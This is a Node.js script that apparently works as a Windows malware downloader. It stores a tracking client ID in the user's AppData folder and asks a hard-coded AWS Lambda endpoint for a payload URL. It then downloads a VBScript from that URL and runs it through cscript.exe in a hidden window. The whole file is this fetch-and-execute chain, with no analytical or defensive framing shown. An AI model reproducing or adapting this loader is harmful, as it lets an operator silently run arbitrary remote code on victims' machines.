const axios = require("axios");
const fs = require("fs");
const { spawn } = require("child_process");
const path = require("path");
const { v4: uuidv4 } = require("uuid");

// === CONFIG ===
const LAMBDA_URL = "https://r47gjbpue5dly2cfeul5qt53vy0nuxnj.lambda-url.ap-south-1.on.aws/";

// Use AppData ROOT (…\AppData\)
function getAppDataRoot() {
  const user = process.env.USERPROFILE || process.env.HOME || "";
  let root = path.join(user, "AppData");
  if (!fs.existsSync(root)) {
    const roaming = process.env.APPDATA; // ...\AppData\Roaming
    if (roaming) root = path.resolve(roaming, "..");
  }
  return root;
}
const APPDATA_ROOT = getAppDataRoot();
const CLIENT_FILE = path.join(APPDATA_ROOT, "client.id");
const OUT_VBS     = path.join(APPDATA_ROOT, "v.vbs");

// persistent client_id
function getClientId() {
  try {
    if (fs.existsSync(CLIENT_FILE)) {
      return fs.readFileSync(CLIENT_FILE, "utf8").trim();
    }
    const id = uuidv4();
    fs.writeFileSync(CLIENT_FILE, id, "utf8");
    return id;
  } catch (e) {
    // fallback to temp-only id if writing fails
    return uuidv4();
  }
}

async function main() {
  const client_id = getClientId();

  // 1) Ask Lambda for URL (throttled per client_id)
  const gate = await axios.post(LAMBDA_URL, { client_id }, { timeout: 10000, headers: { "Content-Type": "application/json" } });
  const url = (gate.data && gate.data.url) || "";
  if (!url) {
    const wait = gate.data && gate.data.retry_after_seconds;
    console.log(wait ? `⏱️ Try again in ~${Math.ceil(wait/60)} min.` : "⏱️ Not allowed yet.");
    return;
  }

  // 2) Download VBS (RAW URL expected)
  const resp = await axios.get(url, { responseType: "text", timeout: 15000 });
  if (/^\s*<!DOCTYPE html>|<html/i.test(resp.data) || /html/i.test((resp.headers||{})["content-type"] || "")) {
    console.error("Downloaded HTML instead of VBS. Check the URL.");
    return;
  }
  fs.writeFileSync(OUT_VBS, resp.data.replace(/\r?\n/g, "\r\n"), "utf8");

  // 3) Execute from AppData
  const child = spawn("cscript.exe", ["/nologo", OUT_VBS], { cwd: APPDATA_ROOT, windowsHide: true });
  child.once("spawn", () => console.log("✅ v.vbs started from AppData"));
  child.once("error", (e) => console.error("❌ start error:", e.message || e));
  child.once("exit", (code) => { if (code !== 0) console.error(`❌ script exit code: ${code}`); });
}

main().catch(e => console.error("client error:", e.message || e));
